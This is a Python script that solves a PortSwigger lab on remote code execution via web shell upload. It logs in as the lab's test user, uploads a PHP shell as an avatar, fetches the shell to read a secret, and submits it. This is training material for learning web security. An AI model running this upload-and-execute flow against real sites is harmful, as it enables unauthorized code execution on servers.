#!/usr/bin/env python3
# Lab: Remote code execution via web shell upload
# Lab-Link: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def main():
    print('[+] Lab: Remote code execution via web shell upload')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host, 'wiener', 'peter'):
        print(f'[-] Failed to login as wiener')
        sys.exit(-2)
    print(f'[+] Logged in as wiener')

    files = {'avatar': open('shell.php', 'rb')}
    values = {'user': 'wiener', 'csrf': get_csrf_token(client.get(f'{host}/my-account').text)}
    r = client.post(f'{host}/my-account/avatar', files=files, data=values)
    if r.status_code != 200:
        print(f'[-] Failed to upload script file')
        sys.exit(-3)
    print(f'[+] Malicious file uploaded')    

    r = client.get(f'{host}/files/avatars/shell.php')
    if r.status_code != 200:
        print(f'[-] Failed to find uploaded script file')
        sys.exit(-4)

    secret = r.text
    print(f'[+] Secret string is "{secret}"')

    data = {'answer': secret}
    if '"correct":true' in client.post(f'{host}/submitSolution', data=data).text:
        print(f'[+] Successfully submitted secret, lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()
